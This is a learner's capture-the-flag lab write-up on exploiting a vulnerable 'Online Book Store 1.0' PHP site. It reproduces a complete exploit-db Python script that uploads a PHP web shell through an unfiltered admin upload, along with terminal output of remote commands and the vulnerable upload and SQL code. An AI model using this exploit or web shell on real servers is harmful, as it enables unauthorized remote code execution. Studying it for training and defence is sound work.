# 08. Components with known vulnerabilities

[Instroduction] 

In this lab, it just show the beginner how can we find and use pythons script or tools already built to exploit the vulnerability based on in4 of software

- exploit-db is incredibly useful, and for all you beginners you're gonna be using this a lot so it's best to get comfortable with it: [https://www.exploit-db.com](https://www.exploit-db.com/)

*) Task 27 just give us an example of a company which hasn’t update its WordPress and its version is still 4.6. Now, the hacker use wpscan to scan and find out its version. 

- Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and you can find an exploit already made on exploit-db website.

*) Task 28

- Initially, i think that the pythons script on task 28 is to exploit this lab but the script python on task 28 is used for **nostromo web server** to RCE
- However, task28 is a clear example for how to search the perfect tool based on information of sortfware like a version number and a software name so as to exploit the website target.

[Exploit]

Target: http://10.10.122.46/

- Access to the URL, we can see it is CSE book store using PHP with MYSQL as server and boostrap as layout
- Next, i try to search CSE bookstore exploit and see the script called Online Book Store 1.0 - Unauthenticated Remote Code Execution on exploit-db website
- Download the file and run it with URL ⇒ it works :

```
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 47887.py  'http://10.10.122.46/' 
> Attempting to upload PHP web shell...
> Verifying shell upload...
> Web shell uploaded to http://10.10.122.46/bootstrap/img/RhMgwVELy6.php
> Example command usage: http://10.10.122.46/bootstrap/img/RhMgwVELy6.php?cmd=whoami
> Do you wish to launch a shell here? (y/n): y
RCE $ ls
4Bp1GgO6Ye.php
I9DXsSGS3d.php
OU14vBKCrY.php
RhMgwVELy6.php//[*] file php to RCE upload successfully !
....
RCE $ whoami
www-data //  we are user www-data
```

+) Next, we just need to wordcount the file /etc/passwd

```
RCE $ wc -c /etc/passwd
1611 /etc/passwd
```

[Explain the tool]

- The above terminal shows that we upload a payload php to RCE through http://ip/bootstrap/img/payload.php but how does it work?

```
import argparse
import random
import requests
import string
import sys

parser = argparse.ArgumentParser()
parser.add_argument('url', action='store', help='The URL of the target.')
args = parser.parse_args()

// Separate the string input (URL) and remove '/' characters
url = args.url.rstrip('/')
// create a random file and join them 
random_file = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(10))
//[?] simple payload to rce
payload = '<?php echo shell_exec($_GET[\'cmd\']); ?>'

//[?] Prepare the file to be uploaded, named as random_file.php, containing the payload
file = {'image': (random_file + '.php', payload, 'text/php')}
print('> Attempting to upload PHP web shell...')
//[*]Send a POST request to upload the file to the target URL
r = requests.post(url + '/admin_add.php', files=file, data={'add':'1'}, verify=False)
print('> Verifying shell upload...')
//[?] Send a GET request and run command 'echo randomfile' in param cmd 
r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':'echo ' + random_file}, verify=False)

//[?] Check if the random_file is present in the response of r that we have just echo above
if random_file in r.text:
    print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php')
    print('> Example command usage: ' + url + '/bootstrap/img/' + random_file + '.php?cmd=whoami')
    launch_shell = str(input('> Do you wish to launch a shell here? (y/n): '))
    if launch_shell.lower() == 'y':
        while True:
            cmd = str(input('RCE $ '))
            if cmd == 'exit':
                sys.exit(0)
            r = requests.get(url + '/bootstrap/img/' + random_file + '.php', params={'cmd':cmd}, verify=False)
            print(r.text)
else:
    if r.status_code == 200:
        print('> Web shell uploaded to ' + url + '/bootstrap/img/' + random_file + '.php, however a simple command check failed to execute. Perhaps shell_exec is disabled? Try changing the payload.')
    else:
        print('> Web shell failed to upload! The web server may not have write permissions.')        
```

[?] But why it has to upload in bootstrap/img but not other dir ?

- You can see in file admin_add.php which is file for admin only to add new boo

```
 ┌──(kali㉿kali)-[~]
└─$ curl http://10.10.34.223/bootstrap/img/I9DXsSGS3d.php?cmd=cat%20../../admin_add.php 
<?php
        session_start();
        require_once "./functions/admin.php";
        $title = "Add new book";
        require "./template/header.php";
        require "./functions/database_functions.php";
        $conn = db_connect();

        if(isset($_POST['add'])){
              .......
//[*] It add file with name:image with no filter at all only check if the file is set
                if(isset($_FILES['image']) && $_FILES['image']['name'] != ""){
                        $image = $_FILES['image']['name'];
                        $directory_self = str_replace(basename($_SERVER['PHP_SELF']), '', $_SERVER['PHP_SELF']);
// create a variable contains var/www/html/boostrap/img
                        $uploadDirectory = $_SERVER['DOCUMENT_ROOT'] . $directory_self . "bootstrap/img";
                        $uploadDirectory .= $image;
// move upload file to $uploadDirectory
                        move_uploaded_file($_FILES['image']['tmp_name'], $uploadDirectory);
                }

                // find publisher and return pubid
                //[*]untrusted data => sql injecion !!!
                $findPub = "SELECT * FROM publisher WHERE publisher_name = '$publisher'";
                $findResult = mysqli_query($conn, $findPub);
                if(!$findResult){
                        // insert into publisher table and return id
                        $insertPub = "INSERT INTO publisher(publisher_name) VALUES ('$publisher')";
                        $insertResult = mysqli_query($conn, $insertPub);
                        if(!$insertResult){
                                echo "Can't add new publisher " . mysqli_error($conn);
                                exit;
                        }
                        $publisherid = mysql_insert_id($conn);
                } else {
                        $row = mysqli_fetch_assoc($findResult);
                        $publisherid = $row['publisherid'];
                }
.......                                                                  
```

[Testing time ]

```
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.34.223/bootstrap/img/I9DXsSGS3d.php?cmd=pwd               
/var/www/html/bootstrap/img
┌──(kali㉿kali)-[~]
└─$ curl http://10.10.34.223/bootstrap/img/I9DXsSGS3d.php?cmd=ls%20/var/www/html 
README.md
admin.php
admin_add.php
admin_book.php
admin_delete.php
admin_edit.php
admin_signout.php
admin_verify.php
book.php
bookPerPub.php
books.php
bootstrap
cart.php
checkout.php
contact.php
controllers
database
edit_book.php
empty_session.php
functions
index.php
models
process.php
publisher_list.php
purchase.php
template
verify.php
```

⇒ Now we can get all file source code right

**Final result:** 1611
